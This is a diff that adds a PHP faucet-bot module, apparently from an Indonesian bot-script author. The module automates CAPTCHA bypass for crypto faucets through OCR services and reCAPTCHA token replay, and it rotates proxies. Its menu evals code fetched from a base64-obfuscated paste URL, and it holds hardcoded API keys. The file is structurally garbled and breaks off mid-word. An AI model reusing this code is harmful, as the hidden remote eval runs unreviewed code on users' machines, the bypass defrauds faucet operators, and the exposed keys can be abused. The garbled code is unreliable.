@@ -1,1 +1,380 @@
-{"Password":{"Fri":{"Link":"https://teknosimple.com/GLvBHj","Password":"556777432264443"},"Mon":{"Link":"https://teknosimple.com/n2t3jxL6OpPg","Password":"0997665544445666"},"Sat":{"Link":"https://teknosimple.com/xbtAUKe","Password":"5663099874434"},"Sun":{"Link":"https://teknosimple.com/tJfvqq4x"},"Thu":{"Link":"https://teknosimple.com/79K6nZoCih"},"Tue":{"https://teknosimple.com/FTiWYYl","Password":"53343333222234455555666"},"Wed":{"Link":"https://teknosimple.com/HtEu6dzCqC5E","Password":"5665432244333444"}},"Premi":{"Key":"04e91c8348a0967fa81e7e0f57211641879a92e4"},"Script":{"99faucet":{"Status":"on","Text":"Join chanel telegram gays  ~> https://t.me/bagasp1205cps"},"CeloMiner":{"Status":"free","Text":"Infone masehh🗿"},"DogeLand":{"Status":"on","Text":"Join chanel telegram gays  ~> https://t.me/bagasp1205cps"},"Givvy":{"Status":"on","Text":"Gassss bang 🗿"},"SevenFaucet":{"Status":"on","Text":"Kalo error bilang cok "}}}
+class modul{
+public function web($url){$ch=curl_init();curl_setopt($ch,CURLOPT_URL,$url);curl_setopt($ch,CURLOPT_FOLLOWLOCATION, true);curl_setopt($ch,CURLOPT_RETURNTRANSFER, 1);return curl_exec($ch);}function url($url){$headers = array();$headers[] = "Mozilla\/5.0 (Linux; Android 7.1.2; Redmi 4A) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/101.0.4951.40 Mobile Safari\/537.36";$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);$res = curl_exec($ch);return $res;}
+   public function curl($url, $post = 0, $httpheader = 0, $proxy = 0){
+        $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $url);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
+            curl_setopt($ch, CURLOPT_TIMEOUT, 60);
+            curl_setopt($ch, CURLOPT_COOKIE,TRUE);
+            curl_setopt($ch, CURLOPT_COOKIEFILE,"cookie.txt");
+            curl_setopt($ch, CURLOPT_COOKIEJAR,"cookie.txt");
+            if($post){
+                curl_setopt($ch, CURLOPT_POST, true);
+                curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+            }
+            if($httpheader){
+                curl_setopt($ch, CURLOPT_HTTPHEADER, $httpheader);
+            }
+            if($proxy){
+                curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
+                curl_setopt($ch, CURLOPT_PROXY, $proxy);
+               // curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+            }
+            curl_setopt($ch, CURLOPT_HEADER, true);
+            $response = curl_exec($ch);
+            $httpcode = curl_getinfo($ch);
+                if(!$httpcode) return "Curl Error : ".curl_error($ch); else{
+            $header = substr($response, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
+            $body = substr($response, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
+            curl_close($ch);
+                return array($header, $body);
+            }
+   }
+   
+   public function get($url, $ua){
+     return $this->curl($url, null, $ua)[1];
+   }
+   
+   public function post($url, $data, $ua){
+     return $this->curl($url, $data, $ua)[1];
+   }
+   
+   public function Save($namadata){
+        if(file_exists($namadata)){
+            $data = file_get_contents($namadata);
+        }else{
+            $this->ban();
+            $data = readline("\033[1;32m Input ".$namadata." :  ");
+            file_put_contents($namadata,$data);
+        }
+            return $data;
+   }
+<?php
+error_reporting(0);
+date_default_timezone_set("Asia/Jakarta");
+const p = "\033[1;97m",m = "\033[1;31m",k = "\033[1;33m", h = "\033[1;32m",bm = "\033[41m",r = "\033[0m", s = " ✓ ";
+public function menu($no,$txt){
+   echo $this->col("[","p").$this->col($no,"h").$this->col("]","p")." ".$this->col(strtoupper($txt),"c")."\n";
+ }
+   public function tmr($tmer){$color = array("\033[1;37m","\033[0;31m","\033[0;33m","\033[0;32m","\033[0;34m","\033[0;35m");$timer=time()+$tmer;while(true):echo"\r \r";$res=$timer-time(); if($res < 1){break;}$tm = date(' i:s ',$res);echo" \033[1;37m [".$color[rand(0,count($color)-1)].$tm."\033[1;37m]";sleep(1);endwhile;}
+ public function load($data, $file){$handle = fopen($file, 'w');fwrite($handle, $data);fclose($handle); }
+   
+public function pas(){
+awalan:$d = date('D');
+switch($d){
+case "Sat":
+$pw = "6655555433234444";
+$link = "https://carapedi.id/8IMZEO3KFSS";
+$link2 = "https://cararegistrasi.com/m5yjZuMoV";
+break;
+case "Thu":
+$pw = "7765443324554334555";
+$link = "https://carapedi.id/mw0tL";
+$link2 = "https://cararegistrasi.com/CchhyUiCaR";
+break;
+case "Fri":
+$pw = "0999997776555775444";
+$link = "https://carapedi.id/e5Wr5122I";
+$link2 = "https://cararegistrasi.com/ZP60tprM8";
+break;
+case "Mon":
+$pw = "123442244566644333";
+$link = "https://carapedi.id/saguSFOef";
+$link2 = "https://cararegistrasi.com/DFNC88952";
+break;
+case "Tue":
+$pw = "45666332244566774";
+$link = "https://carapedi.id/UZmJe7w";
+$link2 = "https://cararegistrasi.com/9udgVaSlq";
+break;
+case "Wed":
+$pw = "344323455664443345543334444";
+$link = "https://carapedi.id/k0exonQqYmd";
+$link2 = "https://cararegistrasi.com/Dvrl2sa";
+break;
+case "Sun":
+$pw = "89977686555664455555";
+$link = "https://carapedi.id/ReQMeO1ig";
+$link2 = "https://cararegistrasi.com/F0LOVlKryf1";
+break;
+default:
+$pw = "e9b565f8d3b255796f1ffa5120ab3585";
+$link = "https://ponselharian.com/uZ6Llqqik5";
+$link2 = "https://cararegistrasi.com/NsHYMC0PloE";
+break;
+}
+$read = file_get_contents('key.txt');
+if($read != $pw){
+$this->ban();
+echo " \033[1;32m Password  \033[1;32m: \033[1;97m$link\n";
+$p = readline(" \033[1;32mInput Password \033[1;32m: \033[1;97m");
+if($p == $pw){
+$this->ban();
+$this->load($p, 'key.txt');
+echo " \033[1;32mPassword correct √√ \n";
+sleep(1);
+goto awalan;
+}else{
+$this->ban();
+echo " \033[1;31mWrong Password, Please Input again!\n";
+sleep(1);
+goto awalan;
+}}}
+public function s(){$res=file_get_contents(base64_decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1N5dWtyb24xMi9TeXVrcm9uMTIvbWFpbi9zZXJ2ZXIucGhw"));$du=explode('#',explode('#'.title.':',$res)[1])[0];$cu=explode('|',$du)[0];;if($cu == "off" || $cu == null){bn1();$this->Slow(m." Script Di Nonaktifkan\n");$this->Slow(m." By Msk Official \n");exit;}if($cu=="on"){}}
+   public function Slow($msg){
+        $slow = str_split($msg);
+             foreach( $slow as $slowmo ){ 
+                echo $slowmo; 
+                usleep(555);
+            }
+   }
+   public 	function g(){
+        echo $this->slow(p."────────────────────────────────────────────────────────\n");
+   }
+   public function ban(){
+          system('clear');
+         
+         $this->slow( m."██╗  ██╗██████╗");$this->Slow( p."  [✓] CREATOR   : MSK\n");
+$this->Slow( m."╚██╗██╔╝██╔══██╗");$this->Slow( p." [✓] THANKS TO : THE ONE ALMIGHTY GOD\n");
+$this->Slow( m." ╚███╔╝ ██║  ██║");$this->Slow( p." [✓] SUPPORT   : ALL TEAM XD-FANTASY\n");
+$this->Slow( p." ██╔██╗ ██║  ██║");$this->Slow( p." [✓] SUPPORT   : BABYBOT CHANNEL\n");
+$this->Slow( p."██╔╝ ██╗██████╔╝");$this->Slow( p." [✓] SCRIPT    : ".host."\n");
+$this->Slow( p."╚═╝  ╚═╝╚═════╝");$this->Slow( p."  [✓] VERSION   : ".ver."\n");  
+          $this->g();
+   }
+  
+ public function banner($web,$ver){
+        $this->ban();
+  }  
+  
+public function solvemedia2($sol){
+        while(true){
+            $ua_sol = array("Host: api-secure.solvemedia.com","user-agent: ".file_get_contents("User_Agent"),"accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7");
+            $ua_img = array("User-Agent: Mozilla/5.0 (Linux; Android 11; RMX3191 Build/RP1A.200720.011;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","content-type: application/json");
+            $challenge = explode('"',explode('"challenge":"',$this->get($sol,$ua_sol))[1])[0];
+            file_put_contents("image.jpg", $this->get('https://api-secure.solvemedia.com/papi/media?c='.$challenge.';w=300;h=150;fg=000000;bg=f8f8f8',$ua_sol));
+            $base = base64_encode(file_get_contents('image.jpg'));
+            $res = $this->post("https://vision.googleapis.com/v1/images:annotate?key=AIzaSyC3y-Em42htSB8UEZPqptJ78rlvL58_h6Y",'{"requests":[{"image":{"content":"'.$base.'"},"features":[{"type":"TEXT_DETECTION"}]}]}',$ua_img);
+            $var1= explode('"text": "Enter the following:\n', $res);
+            $var2 = explode('\n"', $var1[1]);
+            $var3 = $var2[0];
+            $cap = str_replace('\n',' ',$var3);
+            $capcha = preg_replace("/[^a-z]/", "", $cap);
+            if($capcha){
+            echo m." Tryng Bypass                         \r";
+            return "challenge=".$challenge."&respone=".$capcha;
+             }else{
+                    echo m." Please Wait                          \r";
+              
+        }
+    }     
+    }
+    
+    public function solvemedia($sol){
+        while(true){
+            $ua_sol = array("Host: api-secure.solvemedia.com","user-agent: ".file_get_contents("User_Agent"),"accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7");
+            $ua_img = array("User-Agent: Mozilla/5.0 (Linux; Android 11; RMX3191 Build/RP1A.200720.011;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","content-type: application/json");
+            $challenge = explode('"',explode('"challenge":"',$this->get($sol,$ua_sol))[1])[0];
+            file_put_contents("image.jpg", $this->get('https://api-secure.solvemedia.com/papi/media?c='.$challenge.';w=300;h=150;fg=000000;bg=f8f8f8',$ua_sol));
+            $base = base64_encode(file_get_contents('image.jpg'));
+            $res = $this->post("https://vision.googleapis.com/v1/images:annotate?key=AIzaSyC3y-Em42htSB8UEZPqptJ78rlvL58_h6Y",'{"requests":[{"image":{"content":"'.$base.'"},"features":[{"type":"TEXT_DETECTION"}]}]}',$ua_img);
+            $var1= explode('"text": "Enter the following:\n', $res);
+            $var2 = explode('\n"', $var1[1]);
+            $var3 = $var2[0];
+            $cap = str_replace('\n',' ',$var3);
+            $capcha = preg_replace("/[^a-z]/", "", $cap);
+            if($capcha){
+            echo m." Tryng Bypass                         \r";
+            return "adcopy_response=".$capcha."&adcopy_challenge=".$challenge;
+             }else{
+                    echo m." Please Wait                          \r";
+              
+        }
+    }     
+    }
+    public function bot($x,$y,$z){
+    	return ["+".$y."+".$z."+".$x,"+".$x."+".$y."+".$z,"+".$x."+".$z."+".$y,"+".$y."+".$x."+".$z,"+".$z."+".$y."+".$x,"+".$z."+".$x."+".$y];
+    }
+    public function x($awal,$akhir,$res,$no){
+    $data = explode($akhir,explode($awal,$res)[$no])[0];
+        return $data;
+  }
+    public function Col($str,$color){
+        if($color=="rand"){
+            $color=['h','k','p','k','m'][array_rand(['h','k','b','u','m'])];
+        }
+     $war=array('rw'=>"\033[107m\033[1;31m",'rt'=>"\033[106m\033[1;31m",'ht'=>"\033[0;30m",'p'=>"\033[1;97m",'a'=>"\033[1;30m",'m'=>"\033[1;31m",'h'=>"\033[1;32m",'k'=>"\033[1;33m",'b'=>"\033[1;34m",'u'=>"\033[1;35m",'c'=>"\033[1;36m",'rr'=>"\033[101m\033[1;37m",'rg'=>"\033[102m\033[1;34m",'ry'=>"\033[103m\033[1;30m",'rp1'=>"\033[104m\033[1;37m",'rp2'=>"\033[105m\033[1;37m");
+            return $war[$color].$str."\033[0m";
+    }
+    public function antb($res,$no){
+        $bot = $this->x('rel=\"','\"',$res,$no);
+           return $bot;
+    }
+    public function randomua(){
+	    $url = file_get_contents("https://raw.githubusercontent.com/bagas-p/Data/main/ua.txt");
+	    preg_match_all("/(\s.*)/i",$url,$ua);
+	    $arr = array_filter($ua[1],'strlen');
+	        return trim($arr[array_rand($arr)]);
+    }
+    
+   public function pw(){
+   ps:
+$d=date('D');
+ 
+$get=file_get_contents(base64_decode("aHR0cHM6Ly9yZW50cnkuY28vcGFzOTUvcmF3"));
+
+
+ $link = json_decode($get)->Password->$d->Link;
+    $link2 = json_decode($get)->Password->$d->Link2;
+    $pw = json_decode($get)->Password->$d->Password;
+if($link){
+            $read = file_get_contents('key.txt');
+                if($read != $pw){
+                   self::ban();
+                    echo " \033[1;32m LInk 1 \033[1;32m: \033[1;97m$link\n";
+                    
+                    $p = readline(" \033[1;32mInput \033[1;32m: \033[1;97m");
+                        if($p == $pw){
+                            self::ban();
+                            file_put_contents('key.txt',$p);
+                            echo" \033[1;32mPassword Correct √ \n";
+                            sleep(1);
+                        }else{
+                            self::ban();
+                            echo" \033[1;31m Invalid Password!\n";
+                            goto ps;
+                        }
+                }else{
+                }
+        }else{
+            
+           echo " \033[1;31mPlease cek your conection!\n";
+            exit;
+        }
+   }
+    public function solvemedia_ocr($sol){
+        while(true){
+            $ua_sol = array("Host: api-secure.solvemedia.com","user-agent: ".file_get_contents("User_Agent"),"accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7");
+            $ua_img = array("User-Agent: Mozilla/5.0 (Linux; Android 11; RMX3191 Build/RP1A.200720.011;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36","content-type: application/json");
+            $challenge = explode('"',explode('"challenge":"',$this->get($sol,$ua_sol))[1])[0];
+            file_put_contents("img.jpg", $this->get('https://api-secure.solvemedia.com/papi/media?c='.$challenge.';w=300;h=150;fg=000000;bg=f8f8f8',$ua_sol));
+            $apikey="6a84f1979088957";
+            system('convert img.jpg -gravity North -chop x15 captcha.png 2>/dev/null');
+            $hasil = json_decode(shell_exec('curl --silent -H "apikey:'.$apikey.'" --form "file=@captcha.png" --form "language=eng" --form "ocrengine=2" --form "isOverlayRequired=false" --form "iscreatesearchablepdf=false" https://api.ocr.space/Parse/Image'))->ParsedResults[0]->ParsedText;           
+            $capcha = preg_replace("/[^a-zA-Z]/","", $hasil);
+                if(strlen($capcha) >= 20){
+                    return "adcopy_response=".$capcha."&adcopy_challenge=".$challenge;
+                    break;
+                }else{
+                    echo m." Wait                          \r";
+                    if(file_exists("img.jpg")){
+                        system("rm img.jpg");
+                    }
+                    if(file_exists("captcha.png")){
+                        system("rm captcha.png");
+                    }
+                }
+        }
+    }
+   
+   
+public function recaptchav3(){
+      
+         $ua = array("Host: www.google.com","X-Requested-With: XMLHttpRequest","User-Agent: ".$this->Save("User_Agent"),"Cookie:".$this->Save("cookie_anchor"));
+        $acr = $this->Save("Url_Anchor");
+        
+        $this->Slow(h." Loading Anchor         \r");
+        usleep(55555);
+       
+        $base = $this->x('https://www.google.com/recaptcha/api2/anchor?ar=1&k=','&',$acr,1);
+        $k = explode("&",$acr)[1];
+        $co = explode("&",$acr)[2];
+        $v = explode("&",$acr)[4];
+        $v3 = $this->get($acr, $ua);
+        $v3token = $this->x('id="recaptcha-token" value="','"',$v3,1);
+        $data = "$v&reason=q&c=$v3token&$v&$co";
+        $this->Slow(h." Validating RecaptchaV3         \r");
+        usleep(55555);
+        $acr2 = "https://www.google.com/recaptcha/api2/reload?k=".$base;
+        $v3_verif = $this->post($acr2, $data, $ua   );
+        $v31 = $this->x('"rresp","','"',$v3_verif,1);
+            if($v31){
+                echo "                                            \r";
+                return "recaptchav3=".$v31;
+            }else{
+                $this->Slow(m." wait            \r");
+            }
+    }
+    public function proxy(){
+    u:
+    if(file_exists("proxy.txt")){
+        $ko = file_get_contents('https://ipecho.net/plain');
+        $ih = file_get_contents("proxy.txt");
+        $get =$this-> curl('https://ipecho.net/plain','','',$ih)[1];
+            if(strpos($ih,$get)){
+                echo p." Proxy Active ~> ".h.$ih."\n";
+                return $ih;
+            }else{
+                a:
+                $ip = file_get_contents('https://ipecho.net/plain');
+    	        $file=json_decode($this->curl("https://gimmeproxy.com/api/getProxy?get=true&supportsHttps=true&maxCheckPeriod=3600")[1],1);
+    	        $ipx = $this->curl('https://ipecho.net/plain','','',$file["ipPort"])[1];
+        	        if($ipx == $ip || $ipx <= null){
+        	            echo p." Search Proxy  ".h.$file["ipPort"]."                           \r";    
+        		        goto a;
+        	        }else{
+                	    echo p." Proxy => ".h.$file["ipPort"]." Conected! \n";    
+                		$save = fopen("proxy.txt", "w");
+            	         fwrite($save, $file["ipPort"]);
+            	         fclose($save);        
+	                }
+	       }
+	}else{
+	    $save = fopen("proxy.txt", "w");	
+            	 fclose($save);
+	    goto u;
+	}
+}
+
+
+      
+    public function anycaptcha($apikey,$pageurl,$webkey){
+                k:
+                $ua = array("Host: api.anycaptcha.com","Content-Type: application/json");
+                $data = '{"clientKey": "'.$apikey.'","task":{"type": "RecaptchaV3TaskProxyless","websiteURL": "'.$pageurl.'","websiteKey": "'.$webkey.'","isInvisible": false}}';
+                $r = $this->post("https://api.anycaptcha.com/createTask", $data, $ua);
+                $msg = json_decode($r)->errorDescription;
+                $id = json_decode($r)->taskId;
+               a:
+               $data_2 = '{"clientKey": "'.$apikey.'", "taskId": '.$id.'}';
+               $r2 = $this->post("https://api.anycaptcha.com/getTaskResult", $data_2, $ua);
+               $msg = json_decode($r2)->status;
+                    if($msg == "processing"){
+                        $this->Slow(h."Send Requests     \r");
+                        sleep(1);
+                        goto a;
+                    }
+               $respon = json_decode($r2)->solution->gRecaptchaResponse;
+                     if($respon == null){
+                          $this->Slow(m." Invalid Request        \r");
+                          sleep(2);
+                          goto k;
+                     }else{
+                            return $respon;
+                    }  
+    }      
+    
+ }
+self::banner(host,ver);
+self::menu(1," Bypass Faucet");
+
+$menu=readline(self::col(strtoupper("pilih:"),"mp") );self::g();
+switch ($menu) {
+case 1:
+eval(file_get_contents(base64_decode("aHR0cHM6Ly9yZW50cnkuY28vcGFyc2luZ2t1L3Jhdw==")));
+
+Di
